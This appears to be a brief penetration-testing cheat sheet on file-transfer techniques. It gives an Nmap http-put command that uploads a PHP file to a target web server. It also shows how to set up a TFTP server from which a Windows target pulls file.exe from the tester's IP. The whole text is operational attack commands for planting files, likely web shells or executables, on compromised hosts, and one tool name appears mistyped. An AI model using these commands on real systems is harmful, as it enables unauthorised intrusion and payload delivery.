## Nmap

> nmap -p 80 *TARGET_IP* --script http-put --script-args http-put.url='/remotefile.php',http-put.file='/root/myfile.php'



## TFTP

Installed on Windows XP up to 2003 by default
Ensure tftp is all set up as follows:

```
mkdir /tftp
aftpd --daemon --port 69 /tftp
cp /file/you/want /tftp
```

On Windows 
> tftp -i --yourIP-- get file.exe
